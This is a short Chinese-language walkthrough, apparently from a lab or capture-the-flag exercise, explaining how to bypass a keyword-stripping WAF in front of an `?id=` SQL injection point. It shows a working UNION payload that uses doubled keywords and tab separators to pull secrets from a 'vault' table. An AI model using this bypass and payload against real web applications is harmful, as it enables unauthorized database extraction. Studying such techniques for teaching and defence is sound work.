# 04 - WAF 绕过型 UNION 注入

## 漏洞点

`?id=` 注入点前挂了个 WAF，页面公开了黑名单：

```
union, select, and, or, --, /*, #, 空格
```

底部还回显「过滤后的 id」，方便观察 WAF 处理结果。

## 利用思路

WAF 有两个致命弱点：

1. **关键词只剔除一次（非递归）** —— 双写即可还原：
   - `ununionion` → 剔掉中间的 `union` → `union`
   - `seselectlect`（或 `selselectect`）→ 剔掉 `select` → `select`
2. **只禁空格** —— 用制表符 `%09`（Tab）当分隔符。

原查询 3 列，第 2 列回显到 `<h3>`，用 `group_concat(secret)` 取 `vault` 表数据：

```
?id=0%09ununionion%09seselectlect%091,group_concat(secret),3%09from%09vault
```

看「过滤后的 id」会显示：`0\tunion\tselect\t1,group_concat(secret),3\tfrom\tvault`，
说明双写成功折叠成合法关键词、Tab 正常存活。
